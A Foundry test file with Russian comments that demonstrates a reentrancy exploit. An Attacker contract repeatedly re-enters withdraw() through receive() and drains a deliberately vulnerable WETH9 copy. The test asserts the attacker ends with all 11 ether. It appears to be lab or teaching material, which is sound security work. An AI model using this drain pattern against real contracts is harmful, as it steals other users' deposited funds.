// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {WETH9Vulnerable} from "../src/WETH9Vulnerable.sol";

/// @title Attacker — контракт, эксплуатирующий reentrancy в WETH9Vulnerable
/// @notice Кладёт немного эфира, затем вызывает withdraw. В момент получения
///         эфира срабатывает receive(), который повторно вызывает withdraw,
///         пока на жертве есть средства. Так вытягивается весь эфир контракта.
contract Attacker {
    WETH9Vulnerable public immutable weth;

    // Размер одного вывода за итерацию рекурсии
    uint256 public constant CHUNK = 1 ether;

    constructor(WETH9Vulnerable _weth) {
        weth = _weth;
    }

    /// @notice Запускает атаку: депонирует ВЕСЬ собственный эфир и начинает вывод.
    /// @dev Используем свой текущий баланс (а не msg.value), чтобы точно
    ///      контролировать размер вложения атакующего.
    function attack() external {
        // Кладём собственный эфир, чтобы иметь право на первый withdraw
        weth.deposit{value: address(this).balance}();
        // Первый вывод — он запустит цепочку рекурсивных вызовов через receive()
        weth.withdraw(CHUNK);
    }

    /// @notice Рекурсивная точка входа. Пока на контракте-жертве есть эфир,
    ///         снова вызываем withdraw, повторно входя до обновления баланса.
    receive() external payable {
        if (address(weth).balance >= CHUNK) {
            weth.withdraw(CHUNK);
        }
    }
}

/// @title WETH9DrainTest — тест полного слива уязвимого WETH9 через reentrancy
contract WETH9DrainTest is Test {
    WETH9Vulnerable weth;
    Attacker attacker;

    address victim = makeAddr("victim");

    function setUp() public {
        weth = new WETH9Vulnerable();

        // Жертва вносит 10 эфиров в контракт (честные средства других пользователей)
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        weth.deposit{value: 10 ether}();

        // Разворачиваем атакующего
        attacker = new Attacker(weth);
    }

    function test_ReentrancyDrainsAllEther() public {
        // До атаки: на контракте лежит 10 эфиров жертвы
        assertEq(address(weth).balance, 10 ether, "start: victim's 10 ether");

        // Атакующий вкладывает всего 1 эфир (его собственный)
        vm.deal(address(attacker), 1 ether);
        attacker.attack();

        // Логи для наглядности
        console.log("WETH balance after attack:", address(weth).balance);
        console.log("Attacker balance after attack:", address(attacker).balance);

        // Контракт-жертва полностью опустошён
        assertEq(address(weth).balance, 0, "victim contract fully drained");

        // Атакующий унёс все 11 эфиров: свой 1 + украденные 10
        assertEq(address(attacker).balance, 11 ether, "attacker stole all 11 ether");
    }
}
